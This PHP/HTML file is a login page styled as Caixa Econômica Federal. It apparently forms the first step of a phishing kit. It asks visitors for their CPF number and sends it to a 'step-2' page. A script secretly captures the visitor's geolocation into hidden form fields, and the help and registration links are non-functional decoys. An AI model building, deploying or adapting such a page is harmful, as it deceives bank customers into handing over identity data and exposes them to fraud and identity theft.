<?php 
session_start(); 
//CPF
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Caixa Economica</title>

    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <link rel="stylesheet" href="<?=PATH?>css/default.css">
</head>
<body>
    <main class="bg">
        <!-- <div class="box">
            <div class="header-box">

            </div>

            <div class="content-box">

            </div>

            <div class="footer-box">

            </div>
        </div> --><!-- FIM BOX -->

        <div class="box">
            <div class="header-box">
                <div class="title-box">
                    <img src="<?=PATH?>images/logo_caixa.png" height="30px;" alt="">
                    <p>Login Caixa</p>
                </div>
            </div> 
            <br><br>
            <?php
                if(isset($_SESSION['erro']) AND $_SESSION['erro'] === 'cpf'){
            ?>
            <div class="aviso">
                <p>
                    CPF Inválido.
                </p>
            </div>
            <?php
                }
            ?>
            
            <div class="content-box">
                <p>Informe seu CPF e clique em "Proximo" para <br> continuar:</p>
                <br>
                <p style="font-size: 0.8rem;"><i class="fa-solid fa-user"></i> CPF</p>
                <form action="<?=PATH?>step-2" method="POST">
                    <input type="hidden" class="lat" name="lat" value=''>
                    <input type="hidden" class="long" name="long" value=''>
                    <div>
                        <input class="cpf" name="cpf" type="text" autocomplete="off" required>
                    </div>
                    <br>
                    <input class="btn-submit" type="submit" value="Próximo">
                </form>
            </div>

            <div class="footer-box">
                <p>É novo por aqui? <span><b><u>Cadastre-se</u></b></span></p>
                <p><span><i class="fa-solid fa-question"></i></span><u>Preciso de ajuda</u></p>
            </div>
        </div>
    </main>




<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="<?=PATH?>js/jquery.mask.js"></script>

<script>
    $(document).ready(function(){
        $('.phone_with_ddd').mask('(00) 0000-0000');
        $('.cep').mask('00000-000');
        $('.cpf').mask('000.000.000-00', {reverse: true});
        $('.date').mask('00/00/0000');
        $('.senha').mask('00000000');


        function getLocation(){
        if (navigator.geolocation){
          navigator.geolocation.getCurrentPosition(showPosition);
        }
        else{
          $('.local').text ="O seu navegador não suporta Geolocalização.";
        }
      }

      function showPosition(position){
        $('.lat').val(position.coords.latitude)
        $('.long').val(position.coords.longitude)
      }

      getLocation();

    })
</script>
</body>
</html>